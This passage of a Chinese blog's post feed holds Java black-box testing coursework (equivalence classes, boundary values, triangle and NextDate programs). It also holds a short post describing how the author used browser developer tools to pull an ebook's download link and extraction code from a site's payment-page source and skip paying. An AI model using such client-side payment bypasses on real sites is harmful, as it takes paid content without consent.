class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> exps;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> procs.GunSale;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GunSaleTesting_two</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 驱动函数</span></span><br><span class="line">    <span class="comment">// 枪部件输入、检查函数</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">amountInputAndCheck</span><span class="params">(GunSale gunSale ,<span class="keyword">int</span> part1, <span class="keyword">int</span> part2, <span class="keyword">int</span> part3)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">boolean</span> flag = <span class="keyword">true</span>;</span><br><span class="line"><span class="comment">//        System.out.println("Please input the amount of a gun's every part");</span></span><br><span class="line"><span class="comment">//        System.out.println("----------------------------------------------");</span></span><br><span class="line"><span class="comment">//        System.out.println("------------机枪----枪托----枪管------------");</span></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 输入的数量赋值给gunSale对象，且对其销售数量进行检查</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        gunSale.part1 = part1;</span><br><span class="line">        gunSale.part2 = part2;</span><br><span class="line">        gunSale.part3 = part3;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (gunSale.part1 &lt; <span class="number">1</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">"步枪机不满足最低销售数量"</span>);</span><br><span class="line">            flag = <span class="keyword">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>  (gunSale.part2 &lt; <span class="number">1</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">"枪托不满足最低销售数量"</span>);</span><br><span class="line">            flag = <span class="keyword">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (gunSale.part3 &lt; <span class="number">1</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">"枪管不满足最低销售数量"</span>);</span><br><span class="line">            flag = <span class="keyword">false</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span> (gunSale.part1 &gt; <span class="number">70</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">"步枪机数量超出生产限额"</span>);</span><br><span class="line">            flag = <span class="keyword">false</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span> (gunSale.part2 &gt; <span class="number">80</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">"枪托数量超出生产限额"</span>);</span><br><span class="line">            flag = <span class="keyword">false</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span> (gunSale.part3 &gt; <span class="number">90</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">"枪管数量超出生产限额"</span>);</span><br><span class="line">            flag = <span class="keyword">false</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">"===输入的数值范围正确==="</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> flag;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">checkGunSale</span><span class="params">(GunSaleTesting_two gunSaleTesting_two, GunSale gunSale ,<span class="keyword">int</span> part1, <span class="keyword">int</span> part2, <span class="keyword">int</span> part3)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (gunSaleTesting_two.amountInputAndCheck(gunSale,part1, part2, part3))&#123;</span><br><span class="line">            <span class="keyword">int</span> amountSum = gunSale.amountSumFunction(gunSale);</span><br><span class="line">            <span class="keyword">int</span> priceSum = gunSale.priceSumFunction(gunSale);</span><br><span class="line">            <span class="keyword">double</span> commissionSum = gunSale.commissionSum(gunSale);</span><br><span class="line">            System.out.println(String.format(<span class="string">"=====销售总数是：%1d， 总销售额：%2d，佣金总和：%3f====="</span></span><br><span class="line">                    , amountSum, priceSum, commissionSum));</span><br><span class="line">            System.out.println(<span class="string">"----------------------------------------------"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        GunSaleTesting_two gST_two = <span class="keyword">new</span> GunSaleTesting_two();</span><br><span class="line">        GunSale gS = <span class="keyword">new</span> GunSale();</span><br><span class="line">        <span class="comment">// 对有效等价类设计测试用例</span></span><br><span class="line">        gST_two.checkGunSale(gST_two, gS, <span class="number">35</span>, <span class="number">40</span>, <span class="number">45</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 对无效等价类设计测试用例</span></span><br><span class="line">        gST_two.checkGunSale(gST_two, gS, <span class="number">0</span>, <span class="number">40</span>, <span class="number">45</span>);</span><br><span class="line">        gST_two.checkGunSale(gST_two, gS, <span class="number">35</span>, <span class="number">0</span>, <span class="number">45</span>);</span><br><span class="line">        gST_two.checkGunSale(gST_two, gS, <span class="number">35</span>, <span class="number">40</span>, <span class="number">0</span>);</span><br><span class="line">        gST_two.checkGunSale(gST_two, gS, <span class="number">75</span>, <span class="number">40</span>, <span class="number">45</span>);</span><br><span class="line">        gST_two.checkGunSale(gST_two, gS, <span class="number">35</span>, <span class="number">85</span>, <span class="number">45</span>);</span><br><span class="line">        gST_two.checkGunSale(gST_two, gS, <span class="number">35</span>, <span class="number">40</span>, <span class="number">95</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="佣金问题：-测试结果"><a href="#佣金问题：-测试结果" class="headerlink" title="佣金问题： 测试结果"></a>佣金问题： 测试结果</h3><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191223042559.png" style="zoom:50%;" /><p>测试结果，符合预期。</p><p>##【实验总结】</p><h3 id="等价类测试的一般测试步骤"><a href="#等价类测试的一般测试步骤" class="headerlink" title="等价类测试的一般测试步骤"></a>等价类测试的一般测试步骤</h3><ol><li>按照输入条件建立<em>有效等价类和无效等价类</em>，列出所有划分出的等价类</li><li>为每一个等价类规定一个唯一的编号</li><li>设计一个新的测试用例，使其<strong>尽可能多地覆盖尚未被覆盖地有效等价类</strong>，重复这一步，直到所有的有效等价类都被覆盖为止</li><li>设计一个新的测试用例，使其<strong>仅覆盖一个尚未被覆盖的无效等价类</strong>，重复这一步，直到所有的无效等价类都被覆盖为止</li></ol><h3 id="划分等价类的方法"><a href="#划分等价类的方法" class="headerlink" title="划分等价类的方法"></a>划分等价类的方法</h3><p>规定了取值范围或值的个数的情况下，可以确立一个有效等价类和两个无效等价类</p><p>   e.g. 考试0 - 100， 大于100、小于0无效，[0,100]有效</p><ol><li>规定了输入值的集合或规定了“必须如何”的条件下，可以确立一个有效等价类和一个无效等价类</li><li>输入条件是一个布尔量的情况下，可以确定一个有效等价类，</li><li>一组变量n, n个有效等价类</li><li>必须遵守，1个有效等价类，1个无效等价类</li><li>规定了必须遵守的，需要细分</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 软件工程 </tag>
            
            <tag> 软件测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次支付绕过（伪）的实验</title>
      <link href="/2019/12/22//articles/2019/12/22/1577008796592.html/"/>
      <url>/2019/12/22//articles/2019/12/22/1577008796592.html/</url>
      
        <content type="html"><![CDATA[<img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191222200740.png" alt="封面" style="zoom:50%;" />图：封面<p>马上要学习移动安全的内容了，在圈子里看到，推荐《Android软件安全权威指南·第二版》这本书。最近迫于生活压（mei）力（qian），想着先上车后补票，看一眼电子版ok的话就去买的。于是在网上找到这个网站：</p><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191222173717.png"></p><p>点击立即下载后，跳转到支付宝支付页面，于是出于好奇地，想尝试一下如何绕过。</p><p>网站的右键和F12都写了前端的JS限制：<br><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191222174124.png" style="zoom:50%;" /><br>但，<strong>所有前端的验证/限制都是纸老虎</strong>，直接使用浏览器（Chrome）的开发者工具选项打开：<br><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191222174400.png" style="zoom: 33%;" /></p><p>查看“立即下载”按钮处以及附近的源码，发现网盘的提取码，并且按钮的响应事件是<code>pay()</code>，查找、跳转，查看源码：<br><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191222172946.png"></p><p>发现response部分的信息：<br><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191222173046.png"></p><p>直接双击跳转查看，发现网盘地址，OK<br><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191222172507.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Note </tag>
            
            <tag> 安全综合 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【软件工程】黑盒测试——边界值分析法</title>
      <link href="/2019/12/19//articles/2019/12/19/1576726962803.html/"/>
      <url>/2019/12/19//articles/2019/12/19/1576726962803.html/</url>
      
        <content type="html"><![CDATA[<h1 id="实验一-黑盒测试——边界值分析法"><a href="#实验一-黑盒测试——边界值分析法" class="headerlink" title="实验一 黑盒测试——边界值分析法"></a>实验一 黑盒测试——边界值分析法</h1><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191229104834.png"><br>图：封面  </p><h2 id="【开发语言及实现平台或实验环境】"><a href="#【开发语言及实现平台或实验环境】" class="headerlink" title="【开发语言及实现平台或实验环境】"></a>【开发语言及实现平台或实验环境】</h2><p>开发语言：Java<br>实验平台：Windows10, Intellij IDEA</p><h2 id="【实验目的】"><a href="#【实验目的】" class="headerlink" title="【实验目的】"></a>【实验目的】</h2><ol><li>认识黑盒测试方法中边界值分析测试法原理  </li><li>掌握黑盒测试方法中边界值分析测试法过程</li></ol><h2 id="【实验要求】"><a href="#【实验要求】" class="headerlink" title="【实验要求】"></a>【实验要求】</h2><ol><li>要求学生能够理解黑盒测试的边界值测试方法相关概念和测试的过程、 方法。  </li><li>理解健壮性测试的概念。  </li></ol><h2 id="【实验原理】"><a href="#【实验原理】" class="headerlink" title="【实验原理】"></a>【实验原理】</h2><p>对编写的实验内容，采用边界值分析黑盒测试法进行黑盒测试。</p><h2 id="【实验材料】"><a href="#【实验材料】" class="headerlink" title="【实验材料】"></a>【实验材料】</h2><ol><li><p>三角形问题<br>问题描述:三角形问题接受三个整数，a、b 和 c 作为输入，用作三角<br>形的边。程序的输出是由这三条边确定的三角形类型:等边三角形、等腰 三角形、不等边三角形或非三角形。<br>作为输入:三角形的三条边必须满足如下条件: C1:1&lt;=a&lt;=100<br>C2:1&lt;=b&lt;=100<br>C3:1&lt;=c&lt;=100<br>C4:a&lt;b+c C5:b&lt;a+c C6:c&lt;a+b  </p></li><li><p>NextDate 函数<br>问题描述:NextDate 是一个由三个变量(月份、日期和年份)的函数。<br>函数返回输入日期后边的那个日期。 作为输入:变量月份、日期和年都具有整数值，满足以下条件。<br>C1:1&lt;=月份&lt;=12<br>C2:1&lt;=日期&lt;=31<br>C3:1912&lt;=年&lt;=2050</p></li></ol><h2 id="【实验步骤】"><a href="#【实验步骤】" class="headerlink" title="【实验步骤】"></a>【实验步骤】</h2><ol><li>预习相关课堂和实验内容，了解测试对象。 2. 编写实验材料源代码。</li><li>设计测试用例。</li><li>根据问题需要建立桩模块和驱动模块。、</li><li>测试。</li><li>填写试验报告。<h2 id="【实验代码】"><a href="#【实验代码】" class="headerlink" title="【实验代码】"></a>【实验代码】</h2></li></ol><h3 id="三角形问题"><a href="#三角形问题" class="headerlink" title="三角形问题"></a>三角形问题</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> procs;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">import</span> java.util.InputMismatchException;</span><br><span class="line">        <span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TriangleProc</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> sideA = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> sideB = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> sideC = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TriangleProc</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 函数：验证三角形边的长度范围</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> side</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">verifyLengthRange</span><span class="params">(<span class="keyword">int</span> side)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ((side &gt;= <span class="number">1</span>) &amp;&amp; (side &lt;= <span class="number">100</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(String.format(<span class="string">"边长 %1d 不满足大于等于1且小于等于 100"</span>, side));</span><br><span class="line">            System.out.println(<span class="string">"=========请重新输入========="</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 函数：验证三角形两边之和大于第三边</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> triangleProc</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">verifyFormPrinciple</span><span class="params">(TriangleProc triangleProc)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((triangleProc.sideA + triangleProc.sideB &lt;= triangleProc.sideC)</span><br><span class="line">                || (triangleProc.sideA + triangleProc.sideC &lt;= triangleProc.sideB)</span><br><span class="line">                || (triangleProc.sideB + triangleProc.sideC &lt;= triangleProc.sideA)) &#123;</span><br><span class="line">            System.out.println(String.format(<span class="string">"边长组合为 %1d %2d %3d不满足两边之和大于第三边，是非三角形"</span>,</span><br><span class="line">                    triangleProc.sideA, triangleProc.sideB, triangleProc.sideC));</span><br><span class="line">            System.out.println(<span class="string">"=========请重新输入========="</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">"边长组合满足两边之和大于第三边"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">judgeTriangleType</span><span class="params">(TriangleProc triangleProc)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (triangleProc.sideA == triangleProc.sideB || triangleProc.sideA == triangleProc.sideC</span><br><span class="line">                || triangleProc.sideB == triangleProc.sideC) &#123;</span><br><span class="line">            <span class="keyword">if</span> (triangleProc.sideA == triangleProc.sideB &amp;&amp; triangleProc.sideB == triangleProc.sideC) &#123;</span><br><span class="line">                String triangleType = <span class="string">"等边三角形"</span>;</span><br><span class="line">                <span class="keyword">return</span> triangleType;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                String triangleType = <span class="string">"等腰三角形"</span>;</span><br><span class="line">                <span class="keyword">return</span> triangleType;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            String triangleType = <span class="string">"非等边三角形"</span>;</span><br><span class="line">            <span class="keyword">return</span> triangleType;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">inputEdge</span><span class="params">(Scanner scanner, TriangleProc triangleProc)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> tempSideA = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> tempSideB = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> tempSideC = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//        System.out.println("Welcome to triangle judge program!!!d");</span></span><br><span class="line">        System.out.println(<span class="string">"Please input the side A"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (scanner.hasNext()) &#123;</span><br><span class="line">            tempSideA = scanner.nextInt();</span><br><span class="line">            triangleProc.sideA = tempSideA;</span><br><span class="line">            System.out.println(String.format(<span class="string">"Edge A is %1d. Please input side B"</span>, tempSideA));</span><br><span class="line">            tempSideB = scanner.nextInt();</span><br><span class="line">            triangleProc.sideB = tempSideB;</span><br><span class="line">            System.out.println(String.format(<span class="string">"Edge B is %1d. Please input side C"</span>, tempSideB));</span><br><span class="line">            tempSideC = scanner.nextInt();</span><br><span class="line">            triangleProc.sideC = tempSideC;</span><br><span class="line">            System.out.println(String.format(<span class="string">"Edge C is %1d. The input is finished\n\n"</span>, tempSideC));</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">boolean</span> stopFlag = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (!stopFlag) &#123;</span><br><span class="line">            <span class="keyword">if</span> (verifyLengthRange(triangleProc.sideA) &amp;&amp; verifyLengthRange(triangleProc.sideB)</span><br><span class="line">                    &amp;&amp; verifyLengthRange(triangleProc.sideC)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (verifyFormPrinciple(triangleProc)) &#123;</span><br><span class="line">                    stopFlag = <span class="keyword">true</span>;</span><br><span class="line">                    String triangleType = judgeTriangleType(triangleProc);</span><br><span class="line">                    System.out.println(String.format(<span class="string">"你输入的三角形类型为：%1s"</span>, triangleType));</span><br><span class="line">                    System.out.println(<span class="string">"========The End========"</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    inputEdge(scanner, triangleProc);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 边长不满足两个条件，重新输入</span></span><br><span class="line">                inputEdge(scanner, triangleProc);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 主函数，同时也是测试函数</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> args</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        TriangleProc triangleProc = <span class="keyword">new</span> TriangleProc();</span><br><span class="line">        Scanner scanner = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        triangleProc.inputEdge(scanner, triangleProc);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="运行示例"><a href="#运行示例" class="headerlink" title="运行示例"></a>运行示例</h4><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191219094403.png"></p><h3 id="NextDate"><a href="#NextDate" class="headerlink" title="NextDate"></a>NextDate</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> procs;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.text.ParseException;</span><br><span class="line"><span class="keyword">import</span> java.text.SimpleDateFormat;</span><br><span class="line"><span class="keyword">import</span> java.util.Calendar;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">NextDate</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> year = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> month = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> day = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> String <span class="title">nextDateFunction</span><span class="params">(<span class="keyword">int</span> year, <span class="keyword">int</span> month, <span class="keyword">int</span> day)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        Calendar calendar = Calendar.getInstance();</span><br><span class="line"></span><br><span class="line">        String yearString = Integer.toString(year);</span><br><span class="line">        String monthString = Integer.toString(month);</span><br><span class="line">        String dayString = Integer.toString(day);</span><br><span class="line"></span><br><span class="line">        String stringDate = yearString + <span class="string">'-'</span> + monthString + <span class="string">'-'</span> + dayString;</span><br><span class="line"></span><br><span class="line">        Date date = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            date = <span class="keyword">new</span> SimpleDateFormat(<span class="string">"yyyy-MM-dd"</span>).parse(stringDate);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ParseException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        calendar.setTime(date);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> dayBefore = calendar.get(Calendar.DATE);</span><br><span class="line">        calendar.set(Calendar.DATE, dayBefore + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        String dayAfter = <span class="keyword">new</span> SimpleDateFormat(<span class="string">"yyyy-MM-dd"</span>).format(calendar.getTime());</span><br><span class="line">        <span class="keyword">return</span> dayAfter;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">dateCheckFunction</span><span class="params">(Scanner scanner, NextDate nextDate)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Please Input Your Specific Day"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">"Please Input the Year(1912 &lt;= year &lt;= 2050): "</span>);</span><br><span class="line">            nextDate.year = scanner.nextInt();</span><br><span class="line">        &#125; <span class="keyword">while</span> (nextDate.year &lt; <span class="number">1912</span> || nextDate.year &gt; <span class="number">2050</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">"Please Input the Month(1 &lt;= month &lt;= 12): "</span>);</span><br><span class="line">            nextDate.month = scanner.nextInt();</span><br><span class="line">        &#125; <span class="keyword">while</span> (nextDate.month &lt; <span class="number">1</span> || nextDate.month &gt; <span class="number">12</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">"Please Input the Day(1 &lt;= day &lt;= 31): "</span>);</span><br><span class="line">            nextDate.day = scanner.nextInt();</span><br><span class="line">        &#125; <span class="keyword">while</span> (nextDate.day &lt; <span class="number">1</span> || nextDate.day &gt; <span class="number">31</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        Scanner scanner = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line"></span><br><span class="line">        NextDate nextDate = <span class="keyword">new</span> NextDate();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 检查输入的日期是否符合要求</span></span><br><span class="line">        nextDate.dateCheckFunction(scanner, nextDate);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 根据nextDateFunction函数获取后一天的日期</span></span><br><span class="line">        String dayAfter = nextDate.nextDateFunction(nextDate.year, nextDate.month, nextDate.day);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"The day after is "</span> + dayAfter);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="运行示例-1"><a href="#运行示例-1" class="headerlink" 